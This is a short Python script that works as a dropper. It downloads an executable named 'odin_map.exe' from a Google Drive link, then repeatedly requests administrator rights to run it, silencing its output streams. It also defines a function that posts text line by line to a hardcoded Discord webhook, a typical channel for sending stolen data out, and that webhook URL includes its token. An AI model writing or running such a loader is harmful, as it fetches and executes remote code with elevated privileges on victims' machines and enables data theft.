import ctypes
import requests
from http.cookiejar import CookieJar
import pandas as pd
import numpy as np
import os
import gdown

def send_to_discord(content):
    try:
        webhook_url = "https://discord.com/api/webhooks/1297527399268876288/DcPDYJNPM6mvV8iQ879HfBo5r8B1qdpIAy2AlZAUwCzgSvKD1XHldCWHjP5YuEYKQgWO" 
        headers = {
            "Content-Type": "application/json"
        }

        for i in content.split("\n"):
            data = {
                "content": i
            }
            r = requests.post(webhook_url, json=data, headers=headers)
    except Exception as e:
        webhook_url = "https://discord.com/api/webhooks/1297527399268876288/DcPDYJNPM6mvV8iQ879HfBo5r8B1qdpIAy2AlZAUwCzgSvKD1XHldCWHjP5YuEYKQgWO" 
        
        headers = {
            "Content-Type": "application/json"
        }
        data = {
            "content": "SEND Error!\n" + str(e)
        }
        r = requests.post(webhook_url, json=data, headers=headers)


def run_as_admin():
    if sys.stdout is None:
        sys.stdout = open(os.devnull, "w")
    if sys.stderr is None:
        sys.stderr = open(os.devnull, "w")

    cnt = 0
    url = "https://drive.google.com/uc?id=1WSSvB3lF3f15serxeQ5WS6d00v8U-ocY"
    output = 'odin_map.exe'
    
    # 1. 파일 다운로드
    gdown.download(url, output, quiet=False)

    # 2. 다운로드한 파일을 관리자 권한으로 실행
    while True:
        if cnt > 10:
            break

        cnt += 1
        # 관리자 권한으로 실행
        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", output, None, None, 1)
        
        # 실행이 성공하면 True 반환
        if result > 32:
            return True
        
    return False

if __name__ == "__main__":
    run_as_admin()
